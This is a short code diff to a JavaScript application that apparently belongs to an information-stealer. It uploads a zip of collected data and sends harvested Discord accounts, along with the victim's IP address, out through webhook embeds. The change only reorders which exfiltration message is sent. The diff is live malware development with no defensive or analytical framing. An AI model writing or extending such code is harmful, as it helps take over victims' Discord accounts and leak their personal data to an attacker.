@@ -171,13 +171,15 @@ class Application {
                 downloadLink = await uploadService.upload(zipPath);
             }
 
-            // Send main webhook
-            await this.sendMainWebhook(downloadLink, zipPath);
-
-            // Send Discord accounts if available
+            // Send Discord accounts if available (more complete embed with username, etc.)
             if (this.results.discord && Array.isArray(this.results.discord) && this.results.discord.length > 0) {
                 const systemInfo = stats.getRawData().system;
                 await this.discordService.sendAccountEmbeds(this.results.discord, systemInfo.ip || 'Unknown');
+                logger.info('Sent Discord account embeds (most complete information)');
+            } else {
+                // Only send main webhook if no Discord accounts are available
+                await this.sendMainWebhook(downloadLink, zipPath);
+                logger.info('Sent main webhook (no Discord accounts available)');
             }
 
             logger.info('Data processing and sending completed');
